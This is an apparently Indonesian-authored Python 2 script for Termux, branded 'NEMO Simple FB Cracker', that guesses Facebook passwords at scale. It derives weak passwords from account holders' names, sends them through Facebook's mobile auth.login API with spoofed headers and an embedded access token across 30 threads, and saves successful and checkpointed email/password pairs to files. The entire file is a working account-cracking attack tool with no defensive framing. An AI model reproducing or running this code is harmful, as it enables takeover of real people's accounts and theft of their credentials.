#!/usr/bin/python2
#-*-coding:utf-8-*-

try:
    import requests,bs4,sys,os,subprocess,datetime,shutil,sys,random,time,re,base64,json,glob,mm
    from concurrent.futures import ThreadPoolExecutor as NeMo
    from bs4 import BeautifulSoup as parser
except ImportError:
    exit

reload(sys)
sys.setdefaultencoding("utf-8")

cp = []
ok = []
id = []
user = []
loop = 0

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # NORMAL
my_color = [K, H, O, N]
warna = random.choice(my_color)

logo = """\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m
            \033[1;92m •••••\033[1;97m\033[1m NEMO
            \033[3m Simple FB Cracker\033[0m
\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m"""

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

class __crack__:

    def __init__(self):
        self.id = []

    def __api__(self, user, __emo__):
        global ok,cp,loop
        sys.stdout.write('\r[WAIT] %s/%s -> %s %s'%(loop,len(self.id),len(cp),len(ok))),
        sys.stdout.flush()
        for pw in __emo__:
            pw = pw.lower()
            ngUA = 'Mozilla/5.0 (Series40; NokiaC2-02/07.48; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/4.0.0.0.45'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ngUA, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('/data/data/com.termux/files/home/fb/ok.txt','a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('/data/data/com.termux/files/home/fb/cp.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __brute__(self):
        raw_input('\nENTER to CRACK')
        try:
            path = r'/data/data/com.termux/files/home/fb'
            self.apk = random.choice(glob.glob(path + r'/*.txt'))
            self.id = open(self.apk).read().splitlines()
            print('\nFile: %s'%(self.apk))
        except:
            print('\nCOMPLETE')
            os.sys.exit()
        jalan;time.sleep(0.2)
        with NeMo(max_workers=30) as (__nemoXD__):
            for omen in self.id:
                try:
                    uid, name = omen.split('<=>')
                    x, y = name.split(' ')
                    if len(x) == 3 or len(x) == 4 or len(x) == 5 or len(x) == 6:
                        pwx = [x+" "+y, x+"123", x+"12345", x+"1234", y+"123"]
                    else:
                        pwx = [x+" "+y, x+"123", y+"123"]
                    __nemoXD__.submit(self.__api__, uid, pwx)
                except:
                    pass

        os.remove(self.apk);time.sleep(2)
        rename()

def rename():
    try:
        os.makedirs('/data/data/com.termux/files/home/fb/hasil')
        time.sleep(1)
    except OSError:
        pass
    try:
        open("/data/data/com.termux/files/home/fb/cp.txt","r")
        os.system("mv cp.txt cpcok.txt")
        onem = datetime.datetime.now().strftime("%d%m%y_%H%M%S")
        oldname = r"/data/data/com.termux/files/home/fb/cpcok.txt"
        newname = r"/data/data/com.termux/files/home/fb/hasil/cpcp" + onem + ".txt"
        shutil.move(oldname, newname)
        print("\nDONE")
    except (KeyError, IOError):
        print("\nZONK")
    try:
        open("/data/data/com.termux/files/home/fb/ok.txt","r")
        os.system("mv ok.txt okcok.txt")
        onem = datetime.datetime.now().strftime("%d%m%y_%H%M%S")
        oldname = r"/data/data/com.termux/files/home/fb/okcok.txt"
        newname = r"/data/data/com.termux/files/home/fb/hasil/okok" + onem + ".txt"
        shutil.move(oldname, newname)
        print("\nDONE")
    except (KeyError, IOError):
        pass
    raw_input('\nENTER to CONTINUE')
    sys.exit()

if __name__=='__main__':
    os.system('clear');print logo
    __crack__().__brute__()
